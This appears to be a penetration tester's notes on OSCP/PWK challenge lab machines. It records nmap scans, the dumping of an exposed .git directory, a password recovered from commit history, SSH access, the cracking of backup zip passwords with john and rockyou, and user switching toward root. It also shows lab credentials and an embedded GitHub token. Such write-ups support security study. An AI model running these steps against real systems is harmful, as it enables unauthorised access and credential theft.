    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done                                                                                                                                                                                                
2026/01/09 07:34:37 CMD: UID=1000  PID=7115   | ./pspy64 -pf -i 1000                                                                                                                                
2026/01/09 07:34:37 CMD: UID=1000  PID=7114   | timeout 120 ./pspy64 -pf -i 1000                                                                                                                    
2026/01/09 07:34:37 CMD: UID=1000  PID=6795   | /bin/sh -i                                 
```

it appear every 10 sec , so we may use it\
![Pasted image 20260109153903.png](/ob/Pasted%20image%2020260109153903.png)

```
aero@oscp:/tmp$ ls -al /usr/bin/asinfo
lrwxrwxrwx 1 root root 25 Dec  7  2019 /usr/bin/asinfo -> /opt/aerospike/bin/asinfo
aero@oscp:/tmp$ ls -al /opt/aerospike/bin/asinfo
-rwxr-xr-x 1 aero aero 12855 Dec  7  2019 /opt/aerospike/bin/asinfo
aero@oscp:/tmp$ whoami
aero
```

![Pasted image 20260207144417.png](/ob/Pasted%20image%2020260207144417.png)

![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)

# 192.168.X.144

192.168.136.144

### \[\[PORT & IP SCAN]]

```
Not shown: 65517 closed tcp ports (reset)
PORT      STATE    SERVICE       REASON
21/tcp    open     ftp           syn-ack ttl 61
22/tcp    open     ssh           syn-ack ttl 61
80/tcp    open     http          syn-ack ttl 61
2798/tcp  filtered tmesis-upshot no-response
2916/tcp  filtered elvin_server  no-response
6524/tcp  filtered unknown       no-response
12242/tcp filtered unknown       no-response
12307/tcp filtered unknown       no-response
20141/tcp filtered unknown       no-response
31977/tcp filtered unknown       no-response
40561/tcp filtered unknown       no-response
41472/tcp filtered unknown       no-response
41552/tcp filtered unknown       no-response
54453/tcp filtered unknown       no-response
59164/tcp filtered unknown       no-response
59521/tcp filtered unknown       no-response
60819/tcp filtered unknown       no-response
62417/tcp filtered unknown       no-response

-------

└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.136.144 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 23:17 +0800
Nmap scan report for 192.168.136.144
Host is up (0.053s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           vsftpd 3.0.5
22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp    open   http          Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git: 
|   192.168.136.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
2798/tcp  closed tmesis-upshot
2916/tcp  closed elvin_server
6524/tcp  closed unknown
12242/tcp closed unknown
12307/tcp closed unknown
20141/tcp closed unknown
31977/tcp closed unknown
40561/tcp closed unknown
41472/tcp closed unknown
41552/tcp closed unknown
54453/tcp closed unknown
59164/tcp closed unknown
59521/tcp closed unknown
60819/tcp closed unknown
62417/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
                                                                                                    
```

### \[\[SSH 22]] -- Scans

```
└─#  ssh stuart@192.168.136.144 
The authenticity of host '192.168.136.144 (192.168.136.144)' can't be established.
ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.136.144' (ED25519) to the list of known hosts.
stuart@192.168.136.144's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 14 03:32:39 PM UTC 2026

  System load:  0.0                Processes:               203
  Usage of /:   40.4% of 18.53GB   Users logged in:         0
  Memory usage: 11%                IPv4 address for ens160: 192.168.136.144
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
stuart@oscp:~$ 

```

***

# Web Recon 80

![Pasted image 20260114221737.png](/ob/Pasted%20image%2020260114221737.png)

![Pasted image 20260114221855.png](/ob/Pasted%20image%2020260114221855.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "web-github-abuse" >}} Found the password via .git/ backup file in the database.php

{{< /toggle >}}

### \[\[git recon]]

```
─# uv pip install git-dumper 
Using Python 3.13.11 environment at: haydon_env
Resolved 15 packages in 816ms
Prepared 7 packages in 3.05s
Installed 12 packages in 52ms
 + beautifulsoup4==4.14.3
 + cffi==2.0.0
 + charset-normalizer==3.4.4
 + cryptography==46.0.3
 + dulwich==0.25.2
 + git-dumper==1.0.8
 + pycparser==2.23
 + pysocks==1.7.1
 + requests==2.32.5
 + requests-pkcs12==1.27
 + soupsieve==2.8.1
 + urllib3==2.6.3


------------------------------------------------------------

└─# uv run git-dumper http://192.168.136.144/.git/ .       
[-] Testing http://192.168.136.144/.git/HEAD [200]
[-] Testing http://192.168.136.144/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.136.144/.gitignore [404]
[-] http://192.168.136.144/.gitignore responded with status code 404
[-] Fetching http://192.168.136.144/.git/ [200]
[-] Fetching http://192.168.136.144/.git/index [200]
[-] Fetching http://192.168.136.144/.git/api/ [200]
[-] Fetching http://192.168.136.144/.git/HEAD [200]
Task .git/api/ raised exception:
[-] Fetching http://192.168.136.144/.git/hooks/ [200]
Traceback (most recent call last):
[-] Fetching http://192.168.136.144/.git/README.md [200]
[-] Fetching http://192.168.136.144/.git/branches/ [200]
  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/git_dumper.py", line 155, in run
    result = self.do_task(task, *self.args)
  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/git_dumper.py", line 302, in do_task
    assert is_html(response)
           ~~~~~~~^^^^^^^^^^
AssertionError
[-] Fetching http://192.168.136.144/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.136.144/.git/info/ [200]
[-] Fetching http://192.168.136.144/.git/description [200]
[-] Fetching http://192.168.136.144/.git/configuration/ [200]
[-] Fetching http://192.168.136.144/.git/config [200]
[-] Fetching http://192.168.136.144/.git/logs/ [200]
[-] Fetching http://192.168.136.144/.git/packed-refs [200]
[-] Fetching http://192.168.136.144/.git/objects/ [200]
[-] Fetching http://192.168.136.144/.git/info/exclude [200]
[-] Fetching http://192.168.136.144/.git/refs/ [200]
[-] Fetching http://192.168.136.144/.git/robots.txt [200]
[-] Fetching http://192.168.136.144/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/commit-msg.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.136.144/.git/orders/ [200]
[-] Fetching http://192.168.136.144/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/pre-receive.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://192.168.136.144/.git/hooks/update.sample [200]
[-] Fetching http://192.168.136.144/.git/logs/refs/ [200]
[-] Fetching http://192.168.136.144/.git/refs/remotes/ [200]
[-] Fetching http://192.168.136.144/.git/refs/heads/ [200]
[-] Fetching http://192.168.136.144/.git/configuration/database.php [200]
[-] Fetching http://192.168.136.144/.git/refs/tags/ [200]
[-] Fetching http://192.168.136.144/.git/objects/44/ [200]
[-] Fetching http://192.168.136.144/.git/objects/8a/ [200]
[-] Fetching http://192.168.136.144/.git/objects/80/ [200]
[-] Fetching http://192.168.136.144/.git/logs/HEAD [200]
[-] Fetching http://192.168.136.144/.git/objects/93/ [200]
[-] Fetching http://192.168.136.144/.git/objects/info/ [200]
[-] Fetching http://192.168.136.144/.git/objects/8a/d08b041c8e2dfe72cc2ba90bcaed4d1088873f [200]
[-] Fetching http://192.168.136.144/.git/objects/44/a055daf7a0cd777f28f444c0d29ddf3ff08c54 [200]
[-] Fetching http://192.168.136.144/.git/orders/search.php [200]
[-] Fetching http://192.168.136.144/.git/refs/heads/main [200]
[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/ [200]
[-] Fetching http://192.168.136.144/.git/logs/refs/heads/ [200]
[-] Fetching http://192.168.136.144/.git/refs/remotes/origin/ [200]
[-] Fetching http://192.168.136.144/.git/objects/pack/ [200]
[-] Fetching http://192.168.136.144/.git/objects/80/9af487f5bb4b71659f897b793347ce62a3b5f4 [200]
[-] Fetching http://192.168.136.144/.git/objects/93/290282d106a338e8d8a60e4297173c677aa73d [200]
[-] Fetching http://192.168.136.144/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://192.168.136.144/.git/logs/refs/heads/main [200]
[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://192.168.136.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.idx [200]
[-] Fetching http://192.168.136.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.pack [200]
[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/origin/HEAD [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 7 paths from the index
                                                         
```

### git abuse

```
git log
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php

commit eda55ed6455d29532295684e3900cda74d695067
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:40 2022 +0200

    Create robots.txt

commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:08 2022 +0200

    Create search.php

commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:26:09 2022 +0200

    Setting up database.php

```

![Pasted image 20260114232631.png](/ob/Pasted%20image%2020260114232631.png)

> got the account stuart@challenge.lab : BreakingBad92

```shell
─#     git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

diff --git a/configuration/database.php b/configuration/database.php
new file mode 100644
index 0000000..55b1645
--- /dev/null
+++ b/configuration/database.php
@@ -0,0 +1,19 @@
+<?php
+class Database{
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "stuart@challenge.lab";
+    private $password = "BreakingBad92";
+    public $conn;
+    public function getConnection() {
+        $this->conn = null;
+        try{
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+            $this->conn->exec("set names utf8");
+        }catch(PDOException $exception){
+            echo "Connection error: " . $exception->getMessage();
+        }
+        return $this->conn;
+    }
+}
+?>

```

### \[\[SSH 22]] -- Scans

```
└─#  ssh stuart@192.168.136.144 
The authenticity of host '192.168.136.144 (192.168.136.144)' can't be established.
ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.136.144' (ED25519) to the list of known hosts.
stuart@192.168.136.144's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 14 03:32:39 PM UTC 2026

  System load:  0.0                Processes:               203
  Usage of /:   40.4% of 18.53GB   Users logged in:         0
  Memory usage: 11%                IPv4 address for ens160: 192.168.136.144
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
stuart@oscp:~$ 

```

### stuart to chloe(backup file cred leak)

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-backupfile" >}} Found the backup file in the /opt ,hashcat find the password, in the /joomla/configuration.php find the another password\
{{< /toggle >}}

![Pasted image 20260114234116.png](/ob/Pasted%20image%2020260114234116.png)

```
stuart@oscp:/opt/backup$ ls
sitebackup1.zip  sitebackup2.zip  sitebackup3.zip
stuart@oscp:/opt/backup$ 
```

```
└─# scp -v stuart@192.168.136.144:/opt/backup/sitebackup*.zip ./
Executing: program /usr/bin/ssh host 192.168.136.144, user stuart, command sftp
debug1: OpenSSH_10.2p1 Debian-3, OpenSSL 3.5.4 30 Sep 2025
```

```
──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
└─# file sitebackup1.zip
file sitebackup2.zip
file sitebackup3.zip
sitebackup1.zip: empty
sitebackup2.zip: data
sitebackup3.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Nov 17 2022 10:39:20, uncompressed size 0, method=store                   
```

```
└─# zip2john sitebackup3.zip >hash3
ver 2.0 sitebackup3.zip/joomla/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/administrator/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/api/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cache/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cli/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/components/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/images/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/includes/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/overrides/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/layouts/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/libs/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/media/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/modules/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/plugins/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/templates/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/tmp/ is not encrypted, or stored with non-handled compression type
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
└─# cat hash3 
sitebackup3.zip/joomla/.DS_Store:$zip2$*0*1*0*17fc672f1505f7f7*6a80*446*f1bd10a274d16115fa4ca1725440b59c614b82d000b9656892c7bd10b5f4e33db059a55965df05fccde96e1da40d901d0dff75070b0d9cce76a0e63edab003bfc4ea81f3402de3bcdbdf35c3859510b945a27336b2bfe2a726f4bc58c745a58e14491ca2b84fe1b9a90738f3f560a8e4d876e97e29236f3205ecbae4af101cf8aa522e673cf7a2c25e5b9ad69c21a3d821542245c4794df889e0c8d10ec013f1b64007968f4e7638d1f8502c0092b5324322ba36979a4a60574230a9ede6289863d108971bce84225e04ebaf00fe85b4809ff6f8dc8c6f55fb854f8adabffe6e5707196356568b21cb6cfd3daae69cc293705aaf41aecb9a5d47f7b5556e07e12edf6838cbb8d2144e16024de1f867b06837ef40d45108a9cffbf9e797a31d56b35d86e28375329a6faa0e6f2716cbff58c3c717329a815e7d30328b749e6c995bb2b549b00f3cb4f4e01a53346db64da34e40e3a9bf4ce8bbcbe920f72a40a8b4542e96d635356be01980ece7f1cbdeda02392bdce4363dce2f3679387c52bec8afbaabee436c9ece27cf0992ee8edbe3849a3b7542bb8bafedaef873d8c8f2f039760ad04a044b678d8ff0936f742751dc6b7477d1b3b3b5dfa094cdbfb688cd8be50c031c15df708e5f7c5fc58b602d17f8412322e4a2083ae2e53d9753d59eb5791705417d49d850a1130ebbc85f66cc2ba2249cf9b741176d99a63f03fdb1df0e39d6f5911854bcb7715fff57623d973902d52532936de271c2c2319804a7b76753e68ef2a5f088e8fa90ed0d0ddbb0d607a328dbf44a715371a98d0e668b71c3476c1db89d8f4c85cf4104155487fd3c24ae7a95a0fb24a1d5d20935086872bceb3de44ae37c4fa857daeee36f0f7b5f7ebdb679d5652bbdcfa72c5bcd4143a503ca0017602476af5362e3ecf4da6e6103521141b0a860fd6427441ec2f86b57c1a20017d4f4794d21947e169a9c1806a0a201e0f598f7bd05ccc3b5e51d68760bfc41b1edce23f79f29d9200cd0ec9ae917292451f04399691cefef6e6464dd7adcb2e06a1fc81f643ce809264147dca4c3feba46b29a02a677c4b303367f216febd7b1e592fb00dbbc9c0251da34479361c29aecc7c2b01c9a84c39fd9f4887406a33087fc2bcdf6af5cd8ec6f843f2bf96970b117e823187021d3aba71b05b25b01da2e42c52d38180c34e3a5f21a59aa92bf4e98f3a1e0abbf94520203e6daa411e1076dd0d8253b42b9936ee35b87d8fa76a3ed7c1fda7801ff9b6ec8bdb532a6fb0bc659201a631551ee5faa4d8f636a02dd4e77805ed87447d2707381bff4df09eeeca873ff2d798b50a1d39873c5de6b9c9cce0d06b262c4094b47a96fefabd22c90504d14245b46d7f8a4ca32f73bd5c08ba5bf0bca712137b816a45dbe21b6533e0c53ff65c44a61d88be8bf0f688ff4c3423f96c4b55f888967a71fc70b85beaa2ee3e2a03e6bb6ccbd31e53dd3054ab1c24dc72cfa4d6550c7861e0797eedca1016ba
```

```
# john --wordlist=/usr/share/wordlists/rockyou.txt  hash3 
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 0.14% (ETA: 00:47:23) 0g/s 0p/s 178951c/s 178951C/s 123456..280789
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/app.php)     
codeblue         (sitebackup3.zip/joomla/web.config.txt)     
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
codeblue         (sitebackup3.zip/joomla/cli/index.html)     
codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
codeblue         (sitebackup3.zip/joomla/includes/index.html)     
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
codeblue         (sitebackup3.zip/joomla/cache/index.html)     
codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
codeblue         (sitebackup3.zip/joomla/README.txt)     
codeblue         (sitebackup3.zip/joomla/language/index.html)     
codeblue         (sitebackup3.zip/joomla/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
codeblue         (sitebackup3.zip/joomla/index.php)     
codeblue         (sitebackup3.zip/joomla/configuration.php)     
codeblue         (sitebackup3.zip/joomla/robots.txt)     
codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
19g 0:00:00:05 DONE (2026-01-15 00:24) 3.578g/s 9256p/s 175873c/s 175873C/s 280690..trudy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```
sudo apt install p7zip-full
Ign:1 http://security.kali.org/kali-security kali/updates InRelease
0% [Connecting to http.kali.org (54.39.128.230)] [Connecting to dl.google.com] [Connecting to download.sublimetext.
Get:2 https://dl.google.com/linux/chrome/deb stable InRelease [1,825 B]                                            
Get:3 https://dl.google.com/linux/chrome/deb stable/main amd64 Packages [1,214 B]                                  
Get:4 http://mirror.twds.com.tw/kali kali-rolling InRelease [34.0 kB]                                             
Get:5 https://download.sublimetext.com apt/stable/ InRelease [3,320 B]
Get:6 http://mirror.twds.com.tw/kali kali-rolling/main amd64 Packages [20.9 MB]
Ign:1 http://security.kali.org/kali-security kali/updates InRelease
Ign:1 http://security.kali.org/kali-security kali/updates InRelease
Get:7 http://mirror.twds.com.tw/kali kali-rolling/main amd64 Contents (deb) [52.5 MB]
Err:1 http://security.kali.org/kali-security kali/updates InRelease                                                
  Something wicked happened resolving 'security.kali.org:http' (-5 - No address associated with hostname)
Get:8 http://mirror.twds.com.tw/kali kali-rolling/non-free amd64 Packages [190 kB]                                 
Get:9 http://mirror.twds.com.tw/kali kali-rolling/non-free amd64 Contents (deb) [905 kB]                           
Get:10 http://mirror.twds.com.tw/kali kali-rolling/contrib amd64 Packages [115 kB]                                 
Get:11 http://mirror.twds.com.tw/kali kali-rolling/contrib amd64 Contents (deb) [254 kB]                           
Fetched 74.8 MB in 11s (6,508 kB/s)                                                                                
367 packages can be upgraded. Run 'apt list --upgradable' to see them.
Warning: Failed to fetch http://security.kali.org/kali-security/dists/kali/updates/InRelease  Something wicked happened resolving 'security.kali.org:http' (-5 - No address associated with hostname)
Warning: Some index files failed to download. They have been ignored, or old ones used instead.
Note, selecting '7zip' instead of 'p7zip-full'
7zip is already the newest version (25.01+dfsg-5).
7zip set to manually installed.
Summary:                    
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 367
                                                                                                                    
┌──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
└─# 7z x sitebackup3.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_HK.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 25312 bytes (25 KiB)

Extracting archive: sitebackup3.zip
--
Path = sitebackup3.zip
Type = zip
Physical Size = 25312

    
Enter password (will not be echoed):
Everything is Ok

Folders: 17
Files: 19
Size:       67063
Compressed: 25312

```

```
ls /joomla/configuration.php
```

![Pasted image 20260115004012.png](/ob/Pasted%20image%2020260115004012.png)

```
stuart@oscp:/opt/backup$ su chloe
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

chloe@oscp:/opt/backup$ su root

```

### chloe to root

![Pasted image 20260115004217.png](/ob/Pasted%20image%2020260115004217.png)

![Pasted image 20260115004340.png](/ob/Pasted%20image%2020260115004340.png)

***

# Recon 192.168.x.143

### \[\[PORT & IP SCAN]]

```
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.136.145 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 00:48 +0800
Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 00:51 (0:00:25 remaining)
Nmap scan report for 192.168.136.145
Host is up (0.049s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2025-09-18T02:02:28
|_Not valid after:  2026-03-20T02:02:28
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2026-01-14T16:51:20+00:00
|_ssl-date: 2026-01-14T16:52:00+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.98%I=7%D=1/15%Time=6967C8F0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-14T16:51:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.06 seconds

```

### \[\[Unkown Port]] -- Scans  1978

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

